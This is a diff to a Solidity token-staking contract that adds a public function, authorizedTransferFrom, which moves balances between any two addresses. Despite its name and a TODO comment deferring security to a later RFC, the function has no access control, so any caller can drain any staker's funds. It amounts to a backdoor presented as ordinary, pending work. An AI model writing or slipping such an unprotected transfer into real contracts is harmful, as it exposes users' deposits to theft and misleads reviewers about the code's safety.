@@ -149,4 +149,11 @@ contract TokenStaking {
     function getWithdrawals(address _staker) public view returns (uint256[]) {
         return withdrawalIndices[_staker];
     }
+
+    // TODO: replace with a secure authorization protocol (addressed in RFC 4).
+    function authorizedTransferFrom(address from, address to, uint256 amount) public {
+        balances[from] = balances[from].sub(amount);
+        balances[to] = balances[to].add(amount);
+    }
+
 }
